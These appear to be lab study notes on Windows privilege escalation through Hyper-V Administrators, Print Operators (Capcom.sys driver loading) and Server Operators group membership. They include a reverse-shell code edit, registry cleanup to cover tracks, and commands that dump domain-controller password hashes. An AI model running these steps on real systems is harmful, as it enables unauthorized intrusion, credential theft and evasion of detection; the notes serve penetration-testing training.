## Hyper-V Administrators

Hyper-V Admins could easily create a clone of the DC and mount the VDI/VHDX.

Upon deleteing a VM, `vmms.exe` attempts to restore the original file permissions of the
corresponding .vhdx file and does so as NT AUTHORITY/SYSTEM without impersonating
the user. WE can delete the .vhdx file and create a native hard link to point this file
to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage
this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application
on the server that has installed a service running in the context of SYSTEM.

### Target File

An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update
this PoC to grant our current user full permissions on the file below:
https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

![[Pasted image 20230107150113.png]]

#### Take Ownership of the File

![[Pasted image 20230107150133.png]]

#### Start Mozilla Maintenance Service

![[Pasted image 20230107150156.png]]

## Print Operators

`SeLoadDriverPrivilege`

This repo https://github.com/hfiref0x/UACME features a comprehensive list of UAC bypasses
which can be used form the command line.

#### Confirming Privileges

![[Pasted image 20230107150402.png]]

#### Checking Privileges Again

The `UACMe` repo features a comprehensive list of UAC bypasses from command line.
Examining the permissions again, we see `SeLoadDriverPrivilege` is visible but disabled.

![[Pasted image 20230107151523.png]]

It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute
shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver
and escalate privileges.

We can use this tool https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp to load the driver. The PoC enables the privilege as well as
loads the driver for us.

Download it locally and edit it, pasting the includes listed here:
```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from Visual Studio 2019 Developer Command Prompt, compile it using `cl.exe`
Then download the Capcom.sys driver and save it to `C:\temp`. Issue the command to add
reference to this driver under our HKEY_CURRENT_USER tree.

![[Pasted image 20230107151844.png]]
![[Pasted image 20230107151858.png]]

#### Verify the Driver is not Loaded

![[Pasted image 20230107151939.png]]

#### Verify Privilege is enabled

![[Pasted image 20230107152054.png]]

#### Verify Capcom Driver is listed

![[Pasted image 20230107152122.png]]

#### Use ExploitCapcom Tool to Escalate Privileges

![[Pasted image 20230107152149.png]]

## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We would set up a listener based on the msfvenom payload we generated and hopefully receieve
a reverse shell connection back when executing the exploit. If the reverse connection is blocked
we can try a bind shell or exec/add user payload.

#### Automating the Steps

We can use a tool such as EoPLoaderDriver to automate the process.
```
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

## Clean-up

#### Removing Registry Key

We can cover our tracks a bit by deleting the registry key added earlier.
```cmd-session
reg delete HKCU\System\CurrentControlSet\Capcom
```

# Server Operators

The Server Operators groups allows members to administer Windows servers without needing
assignment of Domain Admin privileges. It's a very highly privileged group.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege`.

#### Querying the AppReadiness Service

![[Pasted image 20230107152440.png]]

#### Checking Service Permissions with PsService

PsService is part of the `Sysinternals suite` to check permissions on the service.

PsService works much like the sc utility and can display service status and configurations, also
allowing you to start, stop, pause, resume and restart services both locally and remotely.

![[Pasted image 20230107152640.png]]

#### Checking Local Admin Group Membership

![[Pasted image 20230107152657.png]]

#### Modifying the Service Binary Path

![[Pasted image 20230107152716.png]]

#### Starting the Service

![[Pasted image 20230107152731.png]]

#### Confirming Local Admin Group Membership

![[Pasted image 20230107152752.png]]

#### Confirming Local Admin Access on the DC
```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

#### Retrieving NTLM Password Hashes from the DC
```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

